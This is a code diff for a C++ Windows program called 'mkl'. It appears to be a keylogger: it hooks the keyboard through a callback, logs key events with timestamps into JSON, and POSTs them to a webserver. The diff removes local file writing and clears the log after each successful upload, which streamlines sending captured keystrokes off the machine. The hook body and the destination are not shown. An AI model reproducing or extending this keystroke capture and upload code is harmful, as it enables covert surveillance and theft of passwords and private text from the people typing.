@@ -75,37 +75,16 @@ void addEvent(std::string key, int time){
 }
 
 void resetJson(){
+
+	std::cout << i << "Wiping events..." << std::endl;
+
 	//Wipe json
-	data.clear()
+	//data.clear();
 
 	//re-init
-	data["app"] = "mkl";
-	data["version"] = sJsonVersion;
+	//data["app"] = "mkl";
+	//data["version"] = sJsonVersion;
 	data["events"] = json::array();
-}
-
-//Write json content to file
-void writeTofile(){
-
-	//Check for output file
-	if (fs::exists(pOut)){
-		//read in from file
-		std::ifstream in(pOut.string());
-		in >> data;
-	} 
-	else {
-		//Cannot find file, re-init
-		std::cout << e << "Cannot find output file, re-initializing...: " << GetLastError() << std::endl;
-
-		//re-init
-		data["app"] = "mkl";
-		data["version"] = sJsonVersion;
-		data["events"] = json::array();
-	}
-
-	//Write to file:
-	std::ofstream out(pOut);
-	out << data.dump(2);
 }
 
 //Send the data to the webserver
@@ -126,17 +105,23 @@ bool sendData(){
 	}
 
 	std::cout << k << "POST sent succesfully!" << std::endl;
+	
+	//Reset the json if send success
+	resetJson();
+
 	return true;
 }
+
+
+
+/*=========================================
+	Callback Functions
+=========================================*/
 
 //Curl Callback
 void WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
 	std::cout << i << "callback fired" << std::endl;
 }
-
-/*=========================================
-	Callback Functions
-=========================================*/
 
 //keyboard hook callback function
 LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
@@ -359,6 +344,9 @@ int main(int argc, char* argv[]){
 		std::cout << i << pOut.filename() << " does not exist, it will be created." << std::endl;
 	} 
 	else {std::cout << k << pOut.filename() << " found." << std::endl;}
+
+	//Init json
+	resetJson();
 
 	/*=========================================
 		Hook Setup
